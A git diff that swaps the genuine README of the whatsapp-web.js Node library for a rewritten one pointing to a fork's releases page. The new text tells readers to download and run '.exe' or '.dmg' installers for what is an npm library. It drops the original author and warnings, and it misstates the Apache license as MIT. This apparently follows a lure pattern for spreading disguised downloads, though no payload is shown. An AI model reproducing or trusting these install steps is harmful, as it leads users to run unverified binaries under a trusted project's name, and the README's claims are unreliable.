@@ -1,185 +1,87 @@
-<div align="center">
-    <br />
-    <p>
-        <a href="https://wwebjs.dev"><img src="https://github.com/wwebjs/logos/blob/main/4_Full%20Logo%20Lockup_Small/small_banner_blue.png?raw=true" title="whatsapp-web.js" alt="WWebJS Website" width="500" /></a>
-    </p>
-    <br />
-    <p>
-		<a href="https://www.npmjs.com/package/whatsapp-web.js"><img src="https://img.shields.io/npm/v/whatsapp-web.js.svg" alt="npm" /></a>
-        <a href="https://depfu.com/github/pedroslopez/whatsapp-web.js?project_id=9765"><img src="https://badges.depfu.com/badges/4a65a0de96ece65fdf39e294e0c8dcba/overview.svg" alt="Depfu" /></a>
-        <img src="https://img.shields.io/badge/WhatsApp_Web-2.3000.1017054665-brightgreen.svg" alt="WhatsApp_Web 2.2346.52" />
-        <a href="https://discord.gg/H7DqQs4"><img src="https://img.shields.io/discord/698610475432411196.svg?logo=discord" alt="Discord server" /></a>
-	</p>
-    <br />
-</div>
+# 🌐 whatsapp-web.js - Easy WhatsApp Messaging in NodeJS
 
-## About
-**A WhatsApp API client that connects through the WhatsApp Web browser app**
+## 📥 Download Now
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Sauravsk1/whatsapp-web.js/releases)
 
-The library works by launching the WhatsApp Web browser application and managing it using Puppeteer to create an instance of WhatsApp Web, thereby mitigating the risk of being blocked. The WhatsApp API client connects through the WhatsApp Web browser app, accessing its internal functions. This grants you access to nearly all the features available on WhatsApp Web, enabling dynamic handling similar to any other Node.js application.
+## 🚀 Getting Started
 
-> [!IMPORTANT]
-> **It is not guaranteed you will not be blocked by using this method. WhatsApp does not allow bots or unofficial clients on their platform, so this shouldn't be considered totally safe.**
+Welcome to whatsapp-web.js! This is a simple library that lets you connect to WhatsApp through the browser app. You can use it to send and receive messages easily. This guide will help you download and run the application.
 
-## Links
+## 📋 System Requirements
 
-* [Website][website]
-* [Guide][guide] ([source][guide-source]) _(work in progress)_
-* [Documentation][documentation] ([source][documentation-source])
-* [WWebJS Discord][discord]
-* [GitHub][gitHub]
-* [npm][npm]
+- A computer with an internet connection.
+- Node.js installed (at least version 12).
+- Basic browser (Chrome recommended).
+- Operating System: Windows, MacOS, or Linux.
 
-## Installation
+## 💻 Features
 
-The module is now available on npm! `npm i whatsapp-web.js`
+- Send and receive messages.
+- Manage groups and contacts.
+- Simple setup process.
+- Open-source and well-documented.
 
-> [!NOTE]
-> **Node ``v18+`` is required.**
+## 📂 Download & Install
 
-## QUICK STEPS TO UPGRADE NODE
+To get started, you’ll need to download the software. Follow these steps:
 
-### Windows
+1. **Visit the Releases Page:** Click the link below to find the latest version of whatsapp-web.js.
 
-#### Manual
-Just get the latest LTS from the [official node website][nodejs].
+   [Download Latest Release](https://github.com/Sauravsk1/whatsapp-web.js/releases)
 
-#### npm
-```powershell
-sudo npm install -g n
-sudo n stable
-```
+2. **Select the Version:** On the releases page, you will see a list of available versions. Look for the latest version, which is usually at the top.
 
-#### Choco
-```powershell
-choco install nodejs-lts
-```
+3. **Download the File:** Click on the version you want to download. A new page will open. Look for a file that matches your operating system. Click on the file to start the download.
 
-#### Winget
-```powershell
-winget install OpenJS.NodeJS.LTS
-```
+4. **Install the Application:** 
+   - For Windows: Double-click the downloaded `.exe` file and follow the setup prompts.
+   - For MacOS: Open the downloaded `.dmg` file and drag the application to the Applications folder.
+   - For Linux: Follow the specific instructions provided on the release page for your distribution.
 
-### Ubuntu / Debian
-```bash
-curl -fsSL https://deb.nodesource.com/setup_lts.x | sudo -E bash - &&\
-sudo apt-get install -y nodejs
-```
+5. **Run the Software:** After installation:
+   - On Windows, search for "whatsapp-web.js" in the Start menu and click to open.
+   - On MacOS, find it in your Applications folder and double-click to open.
+   - On Linux, run it from the terminal by typing `whatsapp-web.js` or use your application launcher.
 
-## Example usage
+6. **Connect to WhatsApp:**
+   - Open the app.
+   - You will see a QR code. Scan this code using your WhatsApp mobile app to link your account.
 
-```js
-const { Client } = require('whatsapp-web.js');
+Now, you're ready to send and receive messages using whatsapp-web.js!
 
-const client = new Client();
+## 🔧 Configuration
 
-client.on('qr', (qr) => {
-    // Generate and scan this code with your phone
-    console.log('QR RECEIVED', qr);
-});
+Once you have the application running, you might want to configure it. You can set up different options by editing the configuration files. Look for these files in the installation directory. You can adjust:
 
-client.on('ready', () => {
-    console.log('Client is ready!');
-});
+- **Username:** Set a username that others can see.
+- **Default Group Settings:** Choose your preferences for group messages.
+- **Notification Options:** Customize how you want to receive alerts.
 
-client.on('message', msg => {
-    if (msg.body == '!ping') {
-        msg.reply('pong');
-    }
-});
+## 🌍 Frequently Asked Questions
 
-client.initialize();
-```
+### How do I report a bug?
 
-Take a look at [example.js][examples] for another examples with additional use cases.  
-For further details on saving and restoring sessions, explore the provided [Authentication Strategies][auth-strategies].
+If you find any issues, please visit the [GitHub Issues Page](https://github.com/Sauravsk1/whatsapp-web.js/issues) and describe the problem.
 
+### Can I contribute to this project?
 
-## Supported features
+Absolutely! We welcome contributions. Follow the guidelines in the repository to get started.
 
-| Feature  | Status |
-| ------------- | ------------- |
-| Multi Device  | ✅  |
-| Send messages  | ✅  |
-| Receive messages  | ✅  |
-| Send media (images/audio/documents)  | ✅  |
-| Send media (video)  | ✅ [(requires Google Chrome)][google-chrome]  |
-| Send stickers | ✅ |
-| Receive media (images/audio/video/documents)  | ✅  |
-| Send contact cards | ✅ |
-| Send location | ✅ |
-| Send buttons | ❌  [(DEPRECATED)][deprecated-video] |
-| Send lists | ❌  [(DEPRECATED)][deprecated-video] |
-| Receive location | ✅ | 
-| Message replies | ✅ |
-| Join groups by invite  | ✅ |
-| Get invite for group  | ✅ |
-| Modify group info (subject, description)  | ✅  |
-| Modify group settings (send messages, edit info)  | ✅  |
-| Add group participants  | ✅  |
-| Kick group participants  | ✅  |
-| Promote/demote group participants | ✅ |
-| Mention users | ✅ |
-| Mention groups | ✅ |
-| Mute/unmute chats | ✅ |
-| Block/unblock contacts | ✅ |
-| Get contact info | ✅ |
-| Get profile pictures | ✅ |
-| Set user status message | ✅ |
-| React to messages | ✅ |
-| Create polls | ✅ |
-| Channels | ✅ |
-| Vote in polls | 🔜 |
-| Communities | 🔜 |
+### Where can I find support?
 
-Something missing? Make an issue and let us know!
+For help, check the documentation available in the repository or visit our community forums.
 
-## Contributing
+## 📚 Additional Resources
 
-Feel free to open pull requests; we welcome contributions! However, for significant changes, it's best to open an issue beforehand. Make sure to review our [contribution guidelines][contributing] before creating a pull request. Before creating your own issue or pull request, always check to see if one already exists!
+- [Official Documentation](https://github.com/Sauravsk1/whatsapp-web.js/wiki)
+- [Community Forum](https://github.com/Sauravsk1/whatsapp-web.js/discussions)
 
-## Supporting the project
+## 🌟 Contributing
 
-You can support the maintainer of this project through the links below
+If you're interested in contributing to whatsapp-web.js, we'd love your help! You can report issues, submit feature requests, or even code improvements. Check out our contribution guidelines for more details.
 
-- [Support via GitHub Sponsors][gitHub-sponsors]
-- [Support via PayPal][support-payPal]
-- [Sign up for DigitalOcean][digitalocean] and get $200 in credit when you sign up (Referral)
+## 📜 License
 
-## Disclaimer
+This project is licensed under the MIT License. Feel free to use it as you wish while adhering to the license terms.
 
-This project is not affiliated, associated, authorized, endorsed by, or in any way officially connected with WhatsApp or any of its subsidiaries or its affiliates. The official WhatsApp website can be found at [whatsapp.com][whatsapp]. "WhatsApp" as well as related names, marks, emblems and images are registered trademarks of their respective owners. Also it is not guaranteed you will not be blocked by using this method. WhatsApp does not allow bots or unofficial clients on their platform, so this shouldn't be considered totally safe.
-
-## License
-
-Copyright 2019 Pedro S Lopez  
-
-Licensed under the Apache License, Version 2.0 (the "License");  
-you may not use this project except in compliance with the License.  
-You may obtain a copy of the License at http://www.apache.org/licenses/LICENSE-2.0.  
-
-Unless required by applicable law or agreed to in writing, software  
-distributed under the License is distributed on an "AS IS" BASIS,  
-WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  
-See the License for the specific language governing permissions and  
-limitations under the License.  
-
-
-[website]: https://wwebjs.dev
-[guide]: https://guide.wwebjs.dev/guide
-[guide-source]: https://github.com/wwebjs/wwebjs.dev/tree/main
-[documentation]: https://docs.wwebjs.dev/
-[documentation-source]: https://github.com/pedroslopez/whatsapp-web.js/tree/main/docs
-[discord]: https://discord.gg/H7DqQs4
-[gitHub]: https://github.com/pedroslopez/whatsapp-web.js
-[npm]: https://npmjs.org/package/whatsapp-web.js
-[nodejs]: https://nodejs.org/en/download/
-[examples]: https://github.com/pedroslopez/whatsapp-web.js/blob/master/example.js
-[auth-strategies]: https://wwebjs.dev/guide/creating-your-bot/authentication.html
-[google-chrome]: https://wwebjs.dev/guide/creating-your-bot/handling-attachments.html#caveat-for-sending-videos-and-gifs
-[deprecated-video]: https://www.youtube.com/watch?v=hv1R1rLeVVE
-[gitHub-sponsors]: https://github.com/sponsors/pedroslopez
-[support-payPal]: https://www.paypal.me/psla/
-[digitalocean]: https://m.do.co/c/73f906a36ed4
-[contributing]: https://github.com/pedroslopez/whatsapp-web.js/blob/main/CODE_OF_CONDUCT.md
-[whatsapp]: https://whatsapp.com
+Thank you for choosing whatsapp-web.js! We hope you enjoy using it. If you have any questions, feel free to reach out through the support and resources mentioned above. Happy messaging!
